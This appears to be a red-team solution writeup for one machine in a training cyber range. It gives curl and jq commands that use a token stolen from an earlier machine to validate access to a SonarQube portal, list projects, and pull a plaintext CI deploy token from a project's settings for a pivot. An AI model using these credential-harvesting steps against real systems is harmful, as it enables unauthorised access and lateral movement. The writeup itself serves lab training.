# solve_red.md — M4 · dev-sonar
## Red Team Solution Writeup
**Range:** RNG-DEV-01 · VIKAS TANTRA
**Machine:** M4 — PUL Code Intelligence Portal
**Vulnerability:** CI/CD token stored in plaintext project settings
**MITRE ATT&CK:** T1552.002

---

## Objective

Use the token retrieved from M3 to query the `pul-firmware-ota` project settings and load the Deploy Commander token for M5.

## Environment

| Item | Value |
|---|---|
| Portal | `203.0.3.36:9200` |
| Project | `pul-firmware-ota` |
| Token source | `$RANGE3_DIR/sonarqube-access.env` |
| Next machine | M5 Deploy Commander, port `8888` |

## Step-by-Step Exploitation

### Step 1 — Validate the SonarQube token

```bash
curl --max-time 8 -fsS http://203.0.3.36:9200/api/authentication/validate \
     -H "X-Sonar-Token: $(sed -n 's/^SONAR_TOKEN=//p' "$RANGE3_DIR/sonarqube-access.env")" | jq .
```

The API returned `valid: true` for the token retrieved from M3.

### Step 2 — List projects

```bash
curl --max-time 8 -fsS http://203.0.3.36:9200/api/projects/search \
     -H "Authorization: Bearer $(sed -n 's/^SONAR_TOKEN=//p' "$RANGE3_DIR/sonarqube-access.env")" | jq .
```

The response includes the `pul-firmware-ota` project.

### Step 3 — Retrieve the project settings

```bash
umask 077
curl --max-time 8 -fsS "http://203.0.3.36:9200/api/settings/values?component=pul-firmware-ota" \
     -H "Authorization: Bearer $(sed -n 's/^SONAR_TOKEN=//p' "$RANGE3_DIR/sonarqube-access.env")" \
     -o "$RANGE3_DIR/sonar-settings.json"
printf 'Setting keys: %s\n' "$(jq -r '[(if type == "array" then .[] else (.settings // .values // [])[] end) | .key] | join(", ")' "$RANGE3_DIR/sonar-settings.json")"
export DEPLOY_TOKEN="$(jq -r '(if type == "array" then .[] else (.settings // .values // [])[] end) | select(.key == "sonar.ci.deploy_token") | .value' "$RANGE3_DIR/sonar-settings.json")"
printf 'Deploy Commander token loaded; value not printed.\n'
```

The settings include `sonar.ci.deploy_token` and `sonar.ci.deploy_url`. The token is loaded into `DEPLOY_TOKEN`; its value is redacted here. The URL stored in the setting contains the placeholder `11.x.x.x`; the deployed M5 service is at `203.0.3.36:8888`.

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Credentials in Configuration | T1552.002 |
| Discovery | Software Discovery | T1518 |

## Pivot

Use `DEPLOY_TOKEN` from this step to access M5. Treat the token as compromised and lab-only.
